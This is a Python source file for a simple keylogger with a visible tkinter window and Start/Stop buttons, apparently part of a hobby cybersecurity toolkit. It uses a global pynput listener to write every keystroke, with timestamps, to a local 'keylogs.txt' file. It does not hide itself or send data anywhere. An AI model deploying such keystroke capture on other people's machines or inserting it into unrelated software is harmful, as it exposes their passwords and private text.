import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import logging

log_dir = ""
logging_active = False  # Flag to indicate whether logging is active or not

def on_press(key):
    global logging_active
    if logging_active:
        logging.info(str(key))

def toggle_logging():
    global logging_active
    if logging_active:
        logging_active = False
        start_button["state"] = "normal"
        stop_button["state"] = "disabled"
        status_var.set("Logging stopped.")
    else:
        logging_active = True
        start_button["state"] = "disabled"
        stop_button["state"] = "normal"
        status_var.set("Logging started")

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

root = tk.Tk()
root.title("Keylogger")
root.iconbitmap("D:\\Multipurpose Cybersecurity Tool\\Favicon\\Key logger.ico")

root.geometry("300x150")
root.resizable(False, False)

status_var = tk.StringVar()
status_label = tk.Label(root, textvariable=status_var, font=("TkDefaultFont", 10))
status_label.grid(row=0, column=0, pady=10, padx=10, columnspan=2)

start_button = tk.Button(root, text="Start", command=toggle_logging, font=("TkDefaultFont", 13))
stop_button = tk.Button(root, text="Stop", command=toggle_logging, state="disabled", font=("TkDefaultFont", 13))

start_button.grid(row=1, column=0, pady=10, padx=20)
stop_button.grid(row=1, column=1, pady=10, padx=20)

with Listener(on_press=on_press) as listener:
    root.mainloop()
